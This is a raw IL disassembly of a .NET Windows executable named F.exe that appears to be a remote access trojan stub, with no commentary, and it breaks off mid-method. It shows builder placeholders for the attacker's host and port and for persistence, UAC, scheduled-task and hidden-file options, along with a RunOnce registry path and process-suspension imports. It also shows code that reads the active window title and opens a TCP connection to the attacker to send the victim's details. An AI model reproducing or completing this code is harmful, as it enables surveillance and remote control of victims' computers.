
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.0.30319.33440
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern ntdll.dll
.module extern ntdll
.module extern kernel32
.module extern user32.dll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly F
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 03 00 00 00 00 00 ) 

  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module F.exe
// MVID: {8CA62688-25A8-445A-8D87-DFA03F28A17D}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x002F0000


// =============== CLASS MEMBERS DECLARATION ===================

.class public auto ansi beforefieldinit F.P
       extends [mscorlib]System.Object
{
  .field private static literal int32 Bg = int32(0x00000004)
  .field private static literal int32 BSp = int32(0x00000008)
  .field public static string Stu
  .field public static string P_0
  .field public static string[] HH
  .field public static string[] PN
  .field public static class F.P INV
  .field private static uint8[] B
  .field public static bool Kb
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static bool Cn
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static int32 NH
  .field public static string HH2
  .field public static string PN2
  .field public static int32 NP
  .field private static string LC
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field public static object MT
  .field public static object PLG
  .field public static string RG
  .field public static string VN
  .field public static string Y
  .field public static string Sl
  .field public static bool Fo
  .field public static bool Fa
  .field public static string Fol
  .field public static bool HE
  .field public static string Ex
  .field public static bool Se
  .field public static bool Sh
  .field public static bool Bt
  .field public static bool A
  .field public static string SeN
  .field public static string DR
  .field public static string Sf
  .field public static bool IsF
  .field public static bool Isu
  .field public static string Sti
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       451 (0x1c3)
    .maxstack  4
    .locals init ([0] string[] VB$t_array$S0)
    IL_0000:  ldsfld     string F.P::Sti
    IL_0005:  ldstr      "\\"
    IL_000a:  ldsfld     string F.P::RG
    IL_000f:  ldstr      ".rtf"
    IL_0014:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_0019:  stsfld     string F.P::Stu
    IL_001e:  ldstr      "Program"
    IL_0023:  stsfld     string F.P::P_0
    IL_0028:  newobj     instance void F.P::.ctor()
    IL_002d:  stsfld     class F.P F.P::INV
    IL_0032:  ldc.i4.0
    IL_0033:  stsfld     bool F.P::Kb
    IL_0038:  ldnull
    IL_0039:  stsfld     class [System]System.Net.Sockets.TcpClient F.P::C
    IL_003e:  ldc.i4.0
    IL_003f:  stsfld     bool F.P::Cn
    IL_0044:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0049:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F.P::F
    IL_004e:  ldc.i4.0
    IL_004f:  stsfld     int32 F.P::NH
    IL_0054:  ldstr      "[H]"
    IL_0059:  stsfld     string F.P::HH2
    IL_005e:  ldstr      "[P]"
    IL_0063:  stsfld     string F.P::PN2
    IL_0068:  ldc.i4.0
    IL_0069:  stsfld     int32 F.P::NP
    IL_006e:  ldstr      ""
    IL_0073:  stsfld     string F.P::LC
    IL_0078:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_007d:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_0082:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0087:  stsfld     class [mscorlib]System.IO.FileInfo F.P::LO
    IL_008c:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0091:  stsfld     class [mscorlib]System.IO.MemoryStream F.P::MeM
    IL_0096:  ldnull
    IL_0097:  stsfld     object F.P::MT
    IL_009c:  ldnull
    IL_009d:  stsfld     object F.P::PLG
    IL_00a2:  ldstr      "[RG]"
    IL_00a7:  stsfld     string F.P::RG
    IL_00ac:  ldstr      "[VN]"
    IL_00b1:  stsfld     string F.P::VN
    IL_00b6:  ldstr      "[Dep]"
    IL_00bb:  stsfld     string F.P::Y
    IL_00c0:  ldstr      "[Slep]"
    IL_00c5:  stsfld     string F.P::Sl
    IL_00ca:  ldstr      "[Flo]"
    IL_00cf:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00d4:  stsfld     bool F.P::Fo
    IL_00d9:  ldstr      "[Fak]"
    IL_00de:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00e3:  stsfld     bool F.P::Fa
    IL_00e8:  ldstr      "[TFol]"
    IL_00ed:  stsfld     string F.P::Fol
    IL_00f2:  ldstr      "[HDexe]"
    IL_00f7:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_00fc:  stsfld     bool F.P::HE
    IL_0101:  ldstr      "[EXE]"
    IL_0106:  stsfld     string F.P::Ex
    IL_010b:  ldstr      "[Schl]"
    IL_0110:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0115:  stsfld     bool F.P::Se
    IL_011a:  ldstr      "[Sho]"
    IL_011f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0124:  stsfld     bool F.P::Sh
    IL_0129:  ldstr      "[Bat]"
    IL_012e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0133:  stsfld     bool F.P::Bt
    IL_0138:  ldstr      "[UAC]"
    IL_013d:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0142:  stsfld     bool F.P::A
    IL_0147:  ldstr      "[Scnam]"
    IL_014c:  stsfld     string F.P::SeN
    IL_0151:  ldstr      "[DR]"
    IL_0156:  stsfld     string F.P::DR
    IL_015b:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
    IL_0160:  stsfld     string F.P::Sf
    IL_0165:  ldstr      "[Isf]"
    IL_016a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_016f:  stsfld     bool F.P::IsF
    IL_0174:  ldstr      "[Isu]"
    IL_0179:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_017e:  stsfld     bool F.P::Isu
    IL_0183:  ldc.i4.5
    IL_0184:  newarr     [mscorlib]System.String
    IL_0189:  stloc.0
    IL_018a:  ldloc.0
    IL_018b:  ldc.i4.0
    IL_018c:  ldsfld     string F.P::DR
    IL_0191:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0196:  stelem.ref
    IL_0197:  ldloc.0
    IL_0198:  ldc.i4.1
    IL_0199:  ldstr      "\\"
    IL_019e:  stelem.ref
    IL_019f:  ldloc.0
    IL_01a0:  ldc.i4.2
    IL_01a1:  ldsfld     string F.P::Fol
    IL_01a6:  stelem.ref
    IL_01a7:  ldloc.0
    IL_01a8:  ldc.i4.3
    IL_01a9:  ldstr      "\\"
    IL_01ae:  stelem.ref
    IL_01af:  ldloc.0
    IL_01b0:  ldc.i4.4
    IL_01b1:  ldsfld     string F.P::RG
    IL_01b6:  stelem.ref
    IL_01b7:  ldloc.0
    IL_01b8:  call       string [mscorlib]System.String::Concat(string[])
    IL_01bd:  stsfld     string F.P::Sti
    IL_01c2:  ret
  } // end of method P::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method P::.ctor

  .method private static void  S(object A) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  castclass  uint8[]
    IL_0006:  call       void F.P::Ind(uint8[])
    IL_000b:  ret
  } // end of method P::S

  .method public static string  ACT() cil managed
  {
    // Code size       96 (0x60)
    .maxstack  3
    .locals init ([0] string ACT,
             [1] string str,
             [2] native int foregroundWindow,
             [3] string winTitle,
             [4] class [mscorlib]System.Exception ex)
    .try
    {
      IL_0000:  call       native int F.P::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000c:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0011:  brfalse.s  IL_001b

      IL_0013:  ldstr      ""
      IL_0018:  stloc.0
      IL_0019:  leave.s    IL_005e

      IL_001b:  ldloc.2
      IL_001c:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0021:  call       int32 F.P::GetWindowTextLength(int64)
      IL_0026:  ldc.i4.1
      IL_0027:  add.ovf
      IL_0028:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_002d:  stloc.3
      IL_002e:  ldloc.2
      IL_002f:  ldloca.s   winTitle
      IL_0031:  ldloc.3
      IL_0032:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0037:  call       int32 F.P::GetWindowText(native int,
                                                    string&,
                                                    int32)
      IL_003c:  pop
      IL_003d:  ldloca.s   winTitle
      IL_003f:  call       string F.P::ENB(string&)
      IL_0044:  stloc.1
      IL_0045:  leave.s    IL_005c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  dup
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  stloc.s    ex
      IL_004f:  ldstr      ""
      IL_0054:  stloc.1
      IL_0055:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005a:  leave.s    IL_005c

    }  // end handler
    IL_005c:  ldloc.1
    IL_005d:  ret

    IL_005e:  ldloc.0
    IL_005f:  ret
  } // end of method P::ACT

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  2
    .locals init ([0] string BS)
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000c:  ret
  } // end of method P::BS

  .method private static pinvokeimpl("ntdll.dll" winapi) 
          bool  NtResumeProcess(native int hHandle) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("ntdll.dll" winapi) 
          bool  NtSuspendProcess(native int hHandle) cil managed preservesig
  {
  }
  .method public static bool  Con() cil managed
  {
    // Code size       807 (0x327)
    .maxstack  8
    .locals init ([0] bool Con,
             [1] class [mscorlib]System.IO.FileInfo lO,
             [2] class [mscorlib]System.Exception V_2,
             [3] class [mscorlib]System.Exception V_3,
             [4] class [mscorlib]System.Exception V_4,
             [5] class [mscorlib]System.Threading.Thread thread,
             [6] string G1,
             [7] string str,
             [8] string r2,
             [9] class [mscorlib]System.Exception V_9,
             [10] class [mscorlib]System.Exception ex,
             [11] class [mscorlib]System.Threading.Thread V_11,
             [12] class [mscorlib]System.IO.FileInfo VB$t_ref$L0,
             [13] object[] VB$t_array$S0,
             [14] string VB$t_string$S0,
             [15] string[] VB$t_array$S1,
             [16] string[] VB$t_array$S2)
    IL_0000:  ldc.i4.0
    IL_0001:  stsfld     bool F.P::Cn
    IL_0006:  ldc.i4.s   10
    IL_0008:  call       object F.P::Thr(int32)
    IL_000d:  pop
    IL_000e:  ldsfld     class [mscorlib]System.IO.FileInfo F.P::LO
    IL_0013:  stloc.1
    IL_0014:  ldloc.1
    IL_0015:  stloc.s    VB$t_ref$L0
    IL_0017:  ldloc.s    VB$t_ref$L0
    IL_0019:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_001e:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
        IL_0023:  brfalse.s  IL_0045

        .try
        {
          IL_0025:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
          IL_002a:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_002f:  ldnull
          IL_0030:  stsfld     class [System]System.Net.Sockets.TcpClient F.P::C
          IL_0035:  leave.s    IL_0045

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0037:  dup
          IL_0038:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_003d:  stloc.2
          IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0043:  leave.s    IL_0045

        }  // end handler
        .try
        {
          IL_0045:  ldsfld     class [mscorlib]System.IO.MemoryStream F.P::MeM
          IL_004a:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_004f:  leave.s    IL_006e

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0051:  dup
          IL_0052:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0057:  stloc.3
          IL_0058:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_005d:  leave.s    IL_006e

        }  // end handler
      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_005f:  dup
        IL_0060:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0065:  stloc.s    V_4
        IL_0067:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_006c:  leave.s    IL_006e

      }  // end handler
      .try
      {
        IL_006e:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0073:  stsfld     class [mscorlib]System.IO.MemoryStream F.P::MeM
        IL_0078:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_007d:  stsfld     class [System]System.Net.Sockets.TcpClient F.P::C
        IL_0082:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
        IL_0087:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_008c:  ldc.i4     0xffff
        IL_0091:  ldc.i4.8
        IL_0092:  ldc.i4.1
        IL_0093:  callvirt   instance void [System]System.Net.Sockets.Socket::SetSocketOption(valuetype [System]System.Net.Sockets.SocketOptionLevel,
                                                                                              valuetype [System]System.Net.Sockets.SocketOptionName,
                                                                                              bool)
        IL_0098:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
        IL_009d:  ldc.i4.m1
        IL_009e:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveTimeout(int32)
        IL_00a3:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
        IL_00a8:  ldc.i4.m1
        IL_00a9:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendTimeout(int32)
        IL_00ae:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
        IL_00b3:  ldc.i4     0xf423f
        IL_00b8:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_00bd:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
        IL_00c2:  ldc.i4     0xf423f
        IL_00c7:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_00cc:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
        IL_00d1:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00d6:  ldc.i4     0xf423f
        IL_00db:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendBufferSize(int32)
        IL_00e0:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
        IL_00e5:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00ea:  ldc.i4     0xf423f
        IL_00ef:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveBufferSize(int32)
        IL_00f4:  ldsfld     class [System]System.Net.Sockets.TcpClient F.P::C
        IL_00f9:  ldnull
        IL_00fa:  ldstr      "Connect"
        IL_00ff:  ldc.i4.2
        IL_0100:  newarr     [mscorlib]System.Object
        IL_0105:  stloc.s    VB$t_array$S0
        IL_0107:  ldloc.s    VB$t_array$S0
        IL_0109:  ldc.i4.0
        IL_010a:  call       object F.P::MH()
        IL_010f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0114:  stelem.ref
        IL_0115:  ldloc.s    VB$t_array$S0
        IL_0117:  ldc.i4.1
        IL_0118:  call       string F.P::NPn()
        IL_011d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_0122:  box        [mscorlib]System.Int32
        IL_0127:  stelem.ref
        IL_0128:  ldloc.s    VB$t_array$S0
        IL_012a:  ldnull
        IL_012b:  ldnull
        IL_012c:  ldnull
        IL_012d:  ldc.i4.1
        IL_012e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_0133:  pop
        IL_0134:  ldnull
        IL_0135:  ldftn      void F.P::_Lambda$__1()
        IL_013b:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                         native int)
        IL_0140:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
        IL_0145:  stloc.s    thread
        IL_0147:  ldloc.s    thread
        IL_0149:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
        IL_014e:  ldc.i4.1
        IL_014f:  stsfld     bool F.P::Cn
        IL_0154:  ldstr      "l2l"
        IL_0159:  call       bool F.P::Send(string)
        IL_015e:  pop
        .try
        {
          IL_015f:  ldsfld     string F.P::Stu
          IL_0164:  ldstr      ".ini"
          IL_0169:  call       string [mscorlib]System.String::Concat(string,
                                                                      string)
          IL_016e:  stloc.s    G1
          IL_0170:  ldloc.s    G1
          IL_0172:  call       bool [mscorlib]System.IO.File::Exists(string)
          IL_0177:  brtrue.s   IL_0193

          IL_0179:  ldloc.s    str
          IL_017b:  ldsflda    string F.P::VN
          IL_0180:  call       string F.P::DEB(string&)
          IL_0185:  ldstr      "\r\n"
          IL_018a:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_018f:  stloc.s    str
          IL_0191:  br.s       IL_01b5

          IL_0193:  ldloc.s    G1
          IL_0195:  call       string [mscorlib]System.IO.File::ReadAllText(string)
          IL_019a:  stloc.s    r2
          IL_019c:  ldloc.s    str
          IL_019e:  ldloc.s    r2
          IL_01a0:  stloc.s    VB$t_string$S0
          IL_01a2:  ldloca.s   VB$t_string$S0
          IL_01a4:  call       string F.P::DEB(string&)
          IL_01a9:  ldstr      "\r\n"
          IL_01ae:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01b3:  stloc.s    str
          IL_01b5:  ldc.i4.s   16
          IL_01b7:  newarr     [mscorlib]System.String
          IL_01bc:  stloc.s    VB$t_array$S2
          IL_01be:  ldloc.s    VB$t_array$S2
          IL_01c0:  ldc.i4.0
          IL_01c1:  ldc.i4.5
          IL_01c2:  newarr     [mscorlib]System.String
          IL_01c7:  stloc.s    VB$t_array$S1
          IL_01c9:  ldloc.s    VB$t_array$S1
          IL_01cb:  ldc.i4.0
          IL_01cc:  ldloc.s    str
          IL_01ce:  stelem.ref
          IL_01cf:  ldloc.s    VB$t_array$S1
          IL_01d1:  ldc.i4.1
          IL_01d2:  call       object F.P::MH()
          IL_01d7:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_01dc:  stelem.ref
          IL_01dd:  ldloc.s    VB$t_array$S1
          IL_01df:  ldc.i4.2
          IL_01e0:  ldstr      "\r\n"
          IL_01e5:  stelem.ref
          IL_01e6:  ldloc.s    VB$t_array$S1
          IL_01e8:  ldc.i4.3
          IL_01e9:  call       string F.P::NPn()
          IL_01ee:  stelem.ref
          IL_01ef:  ldloc.s    VB$t_array$S1
          IL_01f1:  ldc.i4.4
          IL_01f2:  ldstr      "\r\n"
          IL_01f7:  stelem.ref
          IL_01f8:  ldloc.s    VB$t_array$S1
          IL_01fa:  call       string [mscorlib]System.String::Concat(string[])
          IL_01ff:  stelem.ref
          IL_0200:  ldloc.s    VB$t_array$S2
          IL_0202:  ldc.i4.1
          IL_0203:  ldsfld     string F.P::DR
          IL_0208:  stelem.ref
          IL_0209:  ldloc.s    VB$t_array$S2
          IL_020b:  ldc.i4.2
          IL_020c:  ldstr      "\\"
          IL_0211:  stelem.ref
          IL_0212:  ldloc.s    VB$t_array$S2
          IL_0214:  ldc.i4.3
          IL_0215:  ldsfld     string F.P::Fol
          IL_021a:  stelem.ref
          IL_021b:  ldloc.s    VB$t_array$S2
          IL_021d:  ldc.i4.4
          IL_021e:  ldstr      "\\"
          IL_0223:  stelem.ref
          IL_0224:  ldloc.s    VB$t_array$S2
          IL_0226:  ldc.i4.5
          IL_0227:  ldsfld     string F.P::RG
          IL_022c:  stelem.ref
          IL_022d:  ldloc.s    VB$t_array$S2
          IL_022f:  ldc.i4.6
          IL_0230:  ldstr      "\r\n"
          IL_0235:  stelem.ref
          IL_0236:  ldloc.s    VB$t_array$S2
          IL_0238:  ldc.i4.7
          IL_0239:  ldsfld     string F.P::Ex
          IL_023e:  stelem.ref
          IL_023f:  ldloc.s    VB$t_array$S2
          IL_0241:  ldc.i4.8
          IL_0242:  ldstr      "\r\n"
          IL_0247:  stelem.ref
          IL_0248:  ldloc.s    VB$t_array$S2
          IL_024a:  ldc.i4.s   9
          IL_024c:  ldsfld     bool F.P::Se
          IL_0251:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0256:  stelem.ref
          IL_0257:  ldloc.s    VB$t_array$S2
          IL_0259:  ldc.i4.s   10
          IL_025b:  ldstr      "\r\n"
          IL_0260:  stelem.ref
          IL_0261:  ldloc.s    VB$t_array$S2
          IL_0263:  ldc.i4.s   11
          IL_0265:  ldsfld     bool F.P::Sh
          IL_026a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_026f:  stelem.ref
          IL_0270:  ldloc.s    VB$t_array$S2
          IL_0272:  ldc.i4.s   12
          IL_0274:  ldstr      "\r\n"
          IL_0279:  stelem.ref
          IL_027a:  ldloc.s    VB$t_array$S2
          IL_027c:  ldc.i4.s   13
          IL_027e:  ldsfld     bool F.P::Bt
          IL_0283:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0288:  stelem.ref
          IL_0289:  ldloc.s    VB$t_array$S2
          IL_028b:  ldc.i4.s   14
          IL_028d:  ldstr      "\r\n\r\n"
          IL_0292:  stelem.ref
          IL_0293:  ldloc.s    VB$t_array$S2
          IL_0295:  ldc.i4.s   15
          IL_0297:  ldsfld     bool F.P::Isu
          IL_029c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_02a1:  stelem.ref
          IL_02a2:  ldloc.s    VB$t_array$S2
          IL_02a4:  call       string [mscorlib]System.String::Concat(string[])
          IL_02a9:  stloc.s    str
          IL_02ab:  ldstr      "Micr"
          IL_02b0:  ldsfld     string F.P::Y
          IL_02b5:  ldloca.s   str
          IL_02b7:  call       string F.P::ENB(string&)
          IL_02bc:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_02c1:  call       bool F.P::Send(string)
          IL_02c6:  pop
          IL_02c7:  leave.s    IL_0321

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_02c9:  dup
          IL_02ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_02cf:  stloc.s    V_9
          IL_02d1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_02d6:  leave.s    IL_0321

        }  // end handler
      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02d8:  dup
        IL_02d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02de:  stloc.s    ex
        IL_02e0:  ldnull
        IL_02e1:  ldftn      void F.P::_Lambda$__2()
        IL_02e7:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                         native int)
        IL_02ec:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
        IL_02f1:  stloc.s    V_11
        IL_02f3:  ldloc.s    V_11
        IL_02f5:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
        IL_02fa:  ldsfld     int32 F.P::NH
        IL_02ff:  ldc.i4.1
        IL_0300:  add.ovf
        IL_0301:  stsfld     int32 F.P::NH
        IL_0306:  ldsfld     int32 F.P::NP
        IL_030b:  ldc.i4.1
        IL_030c:  add.ovf
        IL_030d:  stsfld     int32 F.P::NP
        IL_0312:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0317:  leave.s    IL_0321

      }  // end handler
    }  // end .try
    finally
    {
      IL_0319:  ldloc.s    VB$t_ref$L0
      IL_031b:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_0320:  endfinally
    }  // end handler
    IL_0321:  ldsfld     bool F.P::Cn
    IL_0326:  ret
  } // end of method P::Con

  .method public static bool  StKp(class [System]System.Net.Sockets.TcpClient Sok,
                                   uint64 Tm,
                                   uint64 Inl) cil managed
  {
    // Code size       244 (0xf4)
    .maxstack  4
    .locals init ([0] bool StKp,
             [1] uint64[] input,
             [2] uint8[] result,
             [3] uint8[] SIO_KEEPALIVE_VALS,
             [4] int32 i,
             [5] class [mscorlib]System.Exception es,
             [6] int32 VB$t_i4$L0)
    .try
    {
      IL_0000:  ldc.i4.s   12
      IL_0002:  newarr     [mscorlib]System.Byte
      IL_0007:  stloc.3
      IL_0008:  ldc.i4.3
      IL_0009:  newarr     [mscorlib]System.UInt64
      IL_000e:  stloc.1
      IL_000f:  ldarg.1
      IL_0010:  newobj     instance void [mscorlib]System.Decimal::.ctor(uint64)
      IL_0015:  ldsfld     valuetype [mscorlib]System.Decimal [mscorlib]System.Decimal::Zero
      IL_001a:  call       int32 [mscorlib]System.Decimal::Compare(valuetype [mscorlib]System.Decimal,
                                                                   valuetype [mscorlib]System.Decimal)
      IL_001f:  ldc.i4.0
      IL_0020:  ceq
      IL_0022:  ldarg.2
      IL_0023:  newobj     instance void [mscorlib]System.Decimal::.ctor(uint64)
      IL_0028:  ldsfld     valuetype [mscorlib]System.Decimal [mscorlib]System.Decimal::Zero
      IL_002d:  call       int32 [mscorlib]System.Decimal::Compare(valuetype [mscorlib]System.Decimal,
                                                                   valuetype [mscorlib]System.Decimal)
      IL_0032:  ldc.i4.0
      IL_0033:  ceq
      IL_0035:  or
      IL_0036:  brfalse.s  IL_003f

      IL_0038:  ldloc.1
      IL_0039:  ldc.i4.0
      IL_003a:  ldc.i4.0
      IL_003b:  conv.i8
      IL_003c:  stelem.i8
      IL_003d:  br.s       IL_0044

      IL_003f:  ldloc.1
      IL_0040:  ldc.i4.0
      IL_0041:  ldc.i4.1
      IL_0042:  conv.i8
      IL_0043:  stelem.i8
      IL_0044:  ldloc.1
